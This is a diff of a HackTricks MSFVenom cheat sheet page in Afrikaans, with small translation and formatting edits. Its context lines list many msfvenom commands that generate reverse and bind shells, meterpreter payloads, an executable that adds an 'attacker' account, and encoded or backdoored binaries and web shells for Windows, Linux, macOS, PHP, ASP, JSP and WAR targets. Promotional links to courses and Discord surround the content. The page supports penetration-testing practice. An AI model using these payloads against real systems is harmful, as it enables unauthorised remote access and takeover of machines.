@@ -1,21 +1,21 @@
 # MSFVenom - CheatSheet
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Support HackTricks</summary>
 
 * Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en bug bounty jagters!
 
@@ -32,13 +32,13 @@ Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike pla
 
 ***
 
-## Basiese msfvenom
+## Basic msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
 Mens kan ook die `-a` gebruik om die argitektuur te spesifiseer of die `--platform`
 
-## Lys
+## Listing
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
@@ -73,9 +73,7 @@ msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
-{% endcode %}
-
-### CMD-skaal
+### CMD Shell
 
 {% code overflow="wrap" %}
 ```bash
@@ -100,11 +98,11 @@ msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > enco
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
-{% endcode %}
-
 ## Linux Payloads
 
 ### Reverse Shell
+
+{% code overflow="wrap" %}
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
@@ -133,11 +131,7 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
-{% endcode %}
-
 ### **Bind Shell**
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
@@ -158,7 +152,7 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 
 ### ASP/x
 
-#### Terugshell
+#### Terug shell
 
 {% code overflow="wrap" %}
 ```bash
@@ -169,12 +163,14 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 
 ### JSP
 
-#### Terugskakel
+#### Terug shell
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
 ```
+{% endcode %}
+
 ### OORLOG
 
 #### Terug Shell
@@ -207,15 +203,15 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 ```
 {% endcode %}
 
-<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en bug bounty jagters te kommunikeer!
 
 **Hacking Inligting**\
-Betrek jouself met inhoud wat die opwinding en uitdagings van hacking ondersoek
+Neem deel aan inhoud wat die opwinding en uitdagings van hacking ondersoek
 
 **Regte Tyd Hack Nuus**\
-Bly op hoogte van die vinnig bewegende hacking wêreld deur middel van regte tyd nuus en insigte
+Bly op hoogte van die vinnige hacking wêreld deur middel van regte tyd nuus en insigte
 
 **Laaste Aankondigings**\
 Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings
@@ -223,15 +219,15 @@ Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike pla
 **Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Ondersteun HackTricks</summary>
 
 * Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
